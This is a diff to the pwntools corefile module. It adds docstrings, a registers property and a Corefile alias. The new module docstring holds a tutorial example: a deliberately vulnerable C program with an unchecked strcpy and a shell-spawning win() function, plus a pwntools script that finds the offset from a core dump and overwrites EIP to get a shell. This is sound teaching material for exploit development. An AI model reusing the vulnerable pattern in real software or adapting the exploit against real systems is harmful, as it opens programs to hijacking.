@@ -1,3 +1,64 @@
+"""Read information from Core Dumps.
+
+Core dumps are extremely useful when writing exploits, even outside of
+the normal act of debugging things.
+
+Using Corefiles to Automate Exploitation
+----------------------------------------
+
+For example, if you have a trivial buffer overflow and don't want to
+open up a debugger or calculate offsets, you can use a generated core
+dump to extract the relevant information.
+
+.. code-block:: c
+
+    #include <string.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    void win() {
+        system("sh");
+    }
+    int main(int argc, char** argv) {
+        char buffer[64];
+        strcpy(buffer, argv[1]);
+    }
+
+.. code-block:: shell
+
+    $ gcc crash.c -m32 -o crash -fno-stack-protector
+
+.. code-block:: python
+
+    from pwn import *
+
+    # Generate a cyclic pattern so that we can auto-find the offset
+    payload = cyclic(128)
+
+    # Run the process once so that it crashes
+    process(['./crash', payload]).wait()
+
+    # Get the core dump
+    core = Coredump('./core')
+
+    # Our cyclic pattern should have been used as the crashing address
+    assert pack(core.eip) in payload
+
+    # Cool! Now let's just replace that value with the address of 'win'
+    crash = ELF('./crash')
+    payload = fit({
+        cyclic_find(core.eip): crash.symbols.win
+    })
+
+    # Get a shell!
+    io = process(['./crash', payload])
+    io.sendline('id')
+    print io.recvline()
+    # uid=1000(user) gid=1000(user) groups=1000(user)
+
+Module Members
+----------------------------------------
+
+"""
 from __future__ import absolute_import
 
 import collections
@@ -51,15 +112,33 @@ def iter_notes(self):
         yield note
 
 class Mapping(object):
+    """Encapsulates information about a memory mapping in a :class:`Corefile`.
+    """
     def __init__(self, core, name, start, stop, flags):
         self._core=core
+
+        #: Name of the mapping, e.g. ``'/bin/bash'`` or ``'[vdso]'``.
         self.name=name
+
+        #: First mapped byte in the mapping
         self.start=start
+
+        #: First byte after the end of hte mapping
         self.stop=stop
+
+        #: Size of the mapping, in bytes
         self.size=stop-start
+
+        #: Mapping flags, using e.g. ``PROT_READ`` and so on.
         self.flags=flags
+
+    @property
+    def address(self):
+        """:class:`int`: Alias for :data:`Mapping.start`."""
+
     @property
     def permstr(self):
+        """:class:`str`: Human-readable memory permission string, e.g. ``r-xp``."""
         flags = self.flags
         return ''.join(['r' if flags & 4 else '-',
                         'w' if flags & 2 else '-',
@@ -69,43 +148,91 @@ class Mapping(object):
         return '%x-%x %s %x %s' % (self.start,self.stop,self.permstr,self.size,self.name)
 
     def __repr__(self):
-        return '%s(%r, %#x, %#x, %#x, %#x)' % (self.__class__.__name__,
-                                               self.name,
-                                               self.start,
-                                               self.stop,
-                                               self.size,
-                                               self.flags)
+        return '%s(%r, start=%#x, stop=%#x, size=%#x, flags=%#x)' \
+            % (self.__class__.__name__,
+               self.name,
+               self.start,
+               self.stop,
+               self.size,
+               self.flags)
 
     def __int__(self):
         return self.start
 
     @property
     def data(self):
+        """:class:`str`: Memory of the mapping."""
         return self._core.read(self.start, self.size)
 
-class Core(ELF):
-    """Core(*a, **kw) -> Core
-
-    Enhances the inforation available about a corefile (which is an extension
+class Corefile(ELF):
+    """Enhances the inforation available about a corefile (which is an extension
     of the ELF format) by permitting extraction of information about the mapped
     data segments, and register state.
 
-    Registers can be accessed directly, e.g. via ``core_obj.eax``.
+    Registers can be accessed directly, e.g. via ``core_obj.eax`` and enumerated
+    via :data:`Corefile.registers`.
 
-    Mappings can be iterated in order via ``core_obj.mappings``.
+    ::
+
+        >>> c = Corefile('./core')
+        >>> hex(c.eax)
+        '0xfff5f2e0'
+        >>> c.registers
+        {'eax': 4294308576,
+         'ebp': 1633771891,
+         'ebx': 4151132160,
+         'ecx': 4294311760,
+         'edi': 0,
+         'edx': 4294308700,
+         'eflags': 66050,
+         'eip': 1633771892,
+         'esi': 0,
+         'esp': 4294308656,
+         'orig_eax': 4294967295,
+         'xcs': 35,
+         'xds': 43,
+         'xes': 43,
+         'xfs': 0,
+         'xgs': 99,
+         'xss': 43}
+
+    Mappings can be iterated in order via :attr:`Corefile.mappings`.
+
+    ::
+
+        >>> Corefile('./core').mappings
+        [Mapping('/home/user/pwntools/crash', start=0x8048000, stop=0x8049000, size=0x1000, flags=0x5),
+         Mapping('/home/user/pwntools/crash', start=0x8049000, stop=0x804a000, size=0x1000, flags=0x4),
+         Mapping('/home/user/pwntools/crash', start=0x804a000, stop=0x804b000, size=0x1000, flags=0x6),
+         Mapping(None, start=0xf7528000, stop=0xf7529000, size=0x1000, flags=0x6),
+         Mapping('/lib/i386-linux-gnu/libc-2.19.so', start=0xf7529000, stop=0xf76d1000, size=0x1a8000, flags=0x5),
+         Mapping('/lib/i386-linux-gnu/libc-2.19.so', start=0xf76d1000, stop=0xf76d2000, size=0x1000, flags=0x0),
+         Mapping('/lib/i386-linux-gnu/libc-2.19.so', start=0xf76d2000, stop=0xf76d4000, size=0x2000, flags=0x4),
+         Mapping('/lib/i386-linux-gnu/libc-2.19.so', start=0xf76d4000, stop=0xf76d5000, size=0x1000, flags=0x6),
+         Mapping(None, start=0xf76d5000, stop=0xf76d8000, size=0x3000, flags=0x6),
+         Mapping(None, start=0xf76ef000, stop=0xf76f1000, size=0x2000, flags=0x6),
+         Mapping('[vdso]', start=0xf76f1000, stop=0xf76f2000, size=0x1000, flags=0x5),
+         Mapping('/lib/i386-linux-gnu/ld-2.19.so', start=0xf76f2000, stop=0xf7712000, size=0x20000, flags=0x5),
+         Mapping('/lib/i386-linux-gnu/ld-2.19.so', start=0xf7712000, stop=0xf7713000, size=0x1000, flags=0x4),
+         Mapping('/lib/i386-linux-gnu/ld-2.19.so', start=0xf7713000, stop=0xf7714000, size=0x1000, flags=0x6),
+         Mapping('[stack]', start=0xfff3e000, stop=0xfff61000, size=0x23000, flags=0x6)]
+
     """
     def __init__(self, *a, **kw):
         #: The NT_PRSTATUS object.
         self.prstatus = None
 
-        #: Dictionary of memory mappings from {address:name}
+        #: :class:`dict`: Dictionary of memory mappings from ``address`` to ``name``
         self.mappings = []
 
-        #: Address of the stack base
+        #: :class:`int`: Address of the stack base
         self.stack    = None
 
-        #: Environment variables read from the stack {name:address}.
-        #: N.B. Use with the ``string`` method to extract them.
+        #: :class:`dict`: Environment variables read from the stack.  Keys are
+        #: the environment variable name, values are the memory address of the
+        #: variable.
+        #:
+        #: Note: Use with the :meth:`.ELF.string` method to extract them.
         self.env      = {}
 
         try:
@@ -215,35 +342,35 @@ class Core(ELF):
 
     @property
     def vvar(self):
-        """Return the mapping for the vvar"""
+        """:class:`Mapping`: Mapping for the vvar section"""
         for m in self.mappings:
             if m.name == '[vvar]':
                 return m
 
     @property
     def vdso(self):
-        """Return the mapping for the vdso"""
+        """:class:`Mapping`: Mapping for the vdso section"""
         for m in self.mappings:
             if m.name == '[vdso]':
                 return m
 
     @property
     def vsyscall(self):
-        """Return the mapping for the vdso"""
+        """:class:`Mapping`: Mapping for the vsyscall section"""
         for m in self.mappings:
             if m.name == '[vsyscall]':
                 return m
 
     @property
     def libc(self):
-        """Return the first mapping in libc"""
+        """:class:`Mapping`: First mapping for ``libc.so``"""
         for m in self.mappings:
             if m.name and m.name.startswith('libc') and m.name.endswith('.so'):
                 return m
 
     @property
     def exe(self):
-        """Return the first mapping in the executable file."""
+        """:class:`Mapping`: First mapping for the executable file."""
         for m in self.mappings:
             if self.at_entry and m.start <= self.at_entry <= m.stop:
                 return m
@@ -345,24 +472,60 @@ class Core(ELF):
 
     @property
     def maps(self):
-        """A printable string which is similar to /proc/xx/maps."""
+        """:class:`str`: A printable string which is similar to /proc/xx/maps.
+
+        ::
+
+            >>> print Corefile('./core').maps
+            8048000-8049000 r-xp 1000 /home/user/pwntools/crash
+            8049000-804a000 r--p 1000 /home/user/pwntools/crash
+            804a000-804b000 rw-p 1000 /home/user/pwntools/crash
+            f7528000-f7529000 rw-p 1000 None
+            f7529000-f76d1000 r-xp 1a8000 /lib/i386-linux-gnu/libc-2.19.so
+            f76d1000-f76d2000 ---p 1000 /lib/i386-linux-gnu/libc-2.19.so
+            f76d2000-f76d4000 r--p 2000 /lib/i386-linux-gnu/libc-2.19.so
+            f76d4000-f76d5000 rw-p 1000 /lib/i386-linux-gnu/libc-2.19.so
+            f76d5000-f76d8000 rw-p 3000 None
+            f76ef000-f76f1000 rw-p 2000 None
+            f76f1000-f76f2000 r-xp 1000 [vdso]
+            f76f2000-f7712000 r-xp 20000 /lib/i386-linux-gnu/ld-2.19.so
+            f7712000-f7713000 r--p 1000 /lib/i386-linux-gnu/ld-2.19.so
+            f7713000-f7714000 rw-p 1000 /lib/i386-linux-gnu/ld-2.19.so
+            fff3e000-fff61000 rw-p 23000 [stack]
+        """
         return '\n'.join(map(str, self.mappings))
 
     def getenv(self, name):
         """getenv(name) -> int
 
-        Read an environment variable off the stack, and return its address.
+        Read an environment variable off the stack, and return its contents.
 
         Arguments:
             name(str): Name of the environment variable to read.
 
         Returns:
-            The address of the environment variable.
+            :class:`str`: The contents of the environment variable.
         """
         if name not in self.env:
             log.error("Environment variable %r not set" % name)
 
         return self.string(self.env[name]).split('=',1)[-1]
+
+    @property
+    def registers(self):
+        """:class:`dict`: All available registers in the coredump."""
+        rv = {}
+
+        for k in dir(self.prstatus.pr_reg):
+            if k.startswith('_'):
+                continue
+
+            try:
+                rv[k] = int(getattr(self.prstatus.pr_reg, k))
+            except Exception:
+                pass
+
+        return rv
 
     def __getattr__(self, attribute):
         if self.prstatus:
@@ -373,3 +536,5 @@ class Core(ELF):
                 return getattr(self.prstatus.pr_reg, attribute)
 
         return super(Core, self).__getattribute__(attribute)
+
+Core = Corefile
